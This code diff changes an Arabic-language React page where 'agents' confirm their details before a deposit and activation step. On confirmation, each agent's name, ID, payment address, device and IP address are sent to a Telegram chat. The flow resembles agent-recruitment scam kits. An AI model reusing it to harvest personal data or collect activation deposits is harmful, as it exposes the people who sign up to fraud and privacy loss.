@@ -20,9 +20,13 @@ export default function VerifyInfo() {
     }
   }, [user]);
 
+  const isMobCashAgent = user?.agent_type !== 'bank_transfer';
+
   const handleConfirm = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!paymentAddress.trim()) {
+    const finalAddress = paymentAddress.trim() || (isMobCashAgent ? 'MobCash Agent Account' : '');
+
+    if (!isMobCashAgent && !finalAddress) {
       setError(t('payment_address_required') || 'Payment address is required');
       return;
     }
@@ -34,7 +38,7 @@ export default function VerifyInfo() {
       const { error: updateError } = await supabase
         .from('agents')
         .update({ 
-          payment_address: paymentAddress,
+          payment_address: finalAddress,
           status: 'verified',
           current_step: 'Activation Info'
         })
@@ -46,7 +50,7 @@ export default function VerifyInfo() {
       await supabase.from('activities').insert([
         {
           agent_id: user.agent_id,
-          action: 'Agent verified information and added payment address',
+          action: 'Agent verified information and proceeded',
         },
       ]);
 
@@ -57,15 +61,16 @@ export default function VerifyInfo() {
         const time = new Date().toLocaleString('ar-EG');
         const lang = i18n.language === 'ar' ? 'العربية' : 'English';
         
-        const msg = `✅ *تأكيد بيانات الوكيل* ✅\n\n` +
-                    `*ID الوكيل:* \`${user.agent_id}\`\n` +
-                    `*الاسم:* ${user.full_name}\n` +
-                    `*عنوان الدفع:* \`${paymentAddress}\`\n` +
-                    `*اللغة:* ${lang}\n` +
-                    `*الجهاز:* ${device}\n` +
-                    `*IP:* ${ip}\n` +
-                    `*الوقت:* ${time}\n` +
-                    `*الخطوة الحالية:* انتقل إلى صفحة التفعيل`;
+        const msg = `✅ <b>تأكيد بيانات الوكيل</b> ✅\n\n` +
+                    `🆔 <b>ID الوكيل:</b> <code>${user.agent_id}</code>\n` +
+                    `👤 <b>الاسم:</b> ${user.full_name}\n` +
+                    `🏷️ <b>نوع الوكيل:</b> ${isMobCashAgent ? 'وكيل موبيكاش' : 'وكيل تحويل مصرفي'}\n` +
+                    `💳 <b>عنوان الدفع:</b> <code>${finalAddress}</code>\n` +
+                    `🌐 <b>اللغة:</b> ${lang}\n` +
+                    `📱 <b>الجهاز:</b> ${device}\n` +
+                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                    `⏰ <b>الوقت:</b> ${time}\n` +
+                    `⏳ <b>الخطوة الحالية:</b> انتقل إلى صفحة معلومات التفعيل`;
                     
         await sendTelegramMessage(msg);
       } catch (e) {
@@ -73,7 +78,7 @@ export default function VerifyInfo() {
       }
 
       // Update local state and navigate
-      setUser({ ...user, payment_address: paymentAddress, status: 'verified', current_step: 'Activation Info' }, 'agent');
+      setUser({ ...user, payment_address: finalAddress, status: 'verified', current_step: 'Activation Info' }, 'agent');
       navigate('/agent/activation-info');
     } catch (err: any) {
       setError(err.message || t('failed_update_info') || 'Failed to update information');
@@ -85,91 +90,102 @@ export default function VerifyInfo() {
   if (!user) return null;
 
   return (
-    <div className="max-w-2xl mx-auto space-y-6">
-      <div className="text-center mb-8">
-        <h1 className="text-2xl font-bold text-gray-900">{t('verify_info')}</h1>
-        <p className="text-gray-600 mt-2">{t('verify_info_desc')}</p>
+    <div className="max-w-2xl mx-auto space-y-6 pb-12">
+      <div className="text-center mb-6">
+        <h1 className="text-2xl sm:text-3xl font-black text-white">{t('verify_info', 'تأكيد البيانات الشخصية والوكالة')}</h1>
+        <p className="text-slate-400 text-sm mt-1">{t('verify_info_subtitle', 'يرجى مراجعة وتأكيد بياناتك المسجلة للانتقال لخطوة التفعيل')}</p>
       </div>
 
-      <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
+      <div className="bg-slate-900/90 rounded-3xl shadow-2xl border border-slate-800 overflow-hidden">
         <div className="p-6 sm:p-8 space-y-6">
-          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('full_name')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-medium">
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('full_name', 'الاسم الكامل')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                 {user.full_name}
               </div>
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('agent_id')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-mono font-medium">
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('agent_id', 'ID الوكيل')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-amber-400 font-mono font-bold text-sm">
                 {user.agent_id}
               </div>
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('country')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-medium">
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('country', 'الدولة')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                 {user.country}
               </div>
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('city')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-medium">
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('city', 'المدينة')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-white font-bold text-sm">
                 {user.city}
               </div>
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('bank_name')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-medium">
-                {user.bank_name}
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('bank_name', 'البنك / الحساب')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-amber-400 font-mono font-bold text-sm">
+                {user.bank_name || 'MobCash'}
               </div>
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-500 mb-1">{t('commission_rate')}</label>
-              <div className="px-4 py-3 bg-gray-50 rounded-xl border border-gray-200 text-gray-900 font-medium">
-                {user.commission_deposit}% / {user.commission_withdraw}%
+              <label className="block text-xs font-bold text-slate-400 uppercase tracking-wider mb-1">{t('commission_rate', 'نسبة العمولة المقررة')}</label>
+              <div className="px-4 py-3 bg-slate-950 rounded-2xl border border-slate-800 text-emerald-400 font-mono font-bold text-sm">
+                {user.commission_deposit || 5}% إيداع / {user.commission_withdraw || 5}% سحب
               </div>
             </div>
           </div>
 
-          <div className="pt-6 border-t border-gray-100">
-            <div className="bg-blue-50 border border-blue-100 rounded-xl p-4 mb-6 flex items-start gap-3">
-              <AlertCircle className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
-              <p className="text-sm text-blue-800">
-                {t('readonly_notice')}
-              </p>
+          <div className="pt-6 border-t border-slate-800">
+            <div className={`p-4 rounded-2xl mb-6 flex items-start gap-3 border ${
+              isMobCashAgent ? 'bg-emerald-950/60 border-emerald-500/30 text-emerald-200' : 'bg-slate-950 border-slate-800 text-slate-200'
+            }`}>
+              <AlertCircle className={`w-5 h-5 mt-0.5 flex-shrink-0 ${isMobCashAgent ? 'text-emerald-400' : 'text-amber-400'}`} />
+              <div className="text-xs sm:text-sm">
+                <span className="font-bold block mb-0.5 text-white">
+                  {isMobCashAgent ? '🟢 نوع الوكالة: وكيل موبيكاش (MobCash Agent)' : '🏦 نوع الوكالة: وكيل تحويل مصرفي'}
+                </span>
+                <p className="text-slate-300">
+                  {isMobCashAgent 
+                    ? 'بصفتك وكيل موبيكاش معتمد، اضغط مباشرة على زر تأكيد البيانات للمتابعة لصفحة الإيداع والتفعيل.'
+                    : 'يرجى تأكيد إدخال رقم حسابك البنكي أو المحفظة لتنفيذ وتسوية المعاملات.'}
+                </p>
+              </div>
             </div>
 
             <form onSubmit={handleConfirm} className="space-y-6">
               {error && (
-                <div className="text-sm text-red-600 bg-red-50 p-3 rounded-lg border border-red-100">
+                <div className="text-sm text-rose-400 bg-rose-950/60 p-3 rounded-xl border border-rose-500/30">
                   {error}
                 </div>
               )}
               
-              <div>
-                <label className="block text-sm font-medium text-gray-900 mb-2">
-                  {t('payment_address')} <span className="text-red-500">*</span>
-                </label>
-                <input
-                  type="text"
-                  required
-                  value={paymentAddress}
-                  onChange={(e) => setPaymentAddress(e.target.value)}
-                  placeholder={t('payment_address_placeholder') || "Enter your bank account number or wallet address"}
-                  className="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-secondary focus:border-secondary bg-white shadow-sm"
-                />
-              </div>
+              {!isMobCashAgent && (
+                <div>
+                  <label className="block text-xs font-bold text-slate-300 mb-2 uppercase tracking-wider">
+                    {t('payment_address', 'عنوان الدفع / رقم الحساب')} <span className="text-rose-400">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    required={!isMobCashAgent}
+                    value={paymentAddress}
+                    onChange={(e) => setPaymentAddress(e.target.value)}
+                    placeholder={t('payment_address_placeholder', 'أدخل رقم الحساب البنكي أو المحفظة')}
+                    className="w-full px-5 py-4 rounded-2xl border border-slate-700 focus:ring-2 focus:ring-amber-400 focus:border-amber-400 bg-slate-950 font-mono font-bold text-white shadow-inner"
+                  />
+                </div>
+              )}
 
               <button
                 type="submit"
                 disabled={loading}
-                className="w-full py-4 bg-secondary text-white font-medium rounded-xl hover:bg-secondary/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-2 shadow-sm"
+                className="w-full py-4 bg-gradient-to-r from-amber-500 via-yellow-500 to-amber-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-black rounded-2xl transition-all disabled:opacity-50 flex items-center justify-center gap-2 shadow-2xl cursor-pointer text-base"
               >
                 {loading ? '...' : (
                   <>
                     <CheckCircle2 className="w-5 h-5" />
-                    {t('confirm_information')}
+                    {t('confirm_information', 'تأكيد البيانات والمتابعة للتفعيل')}
                   </>
                 )}
               </button>
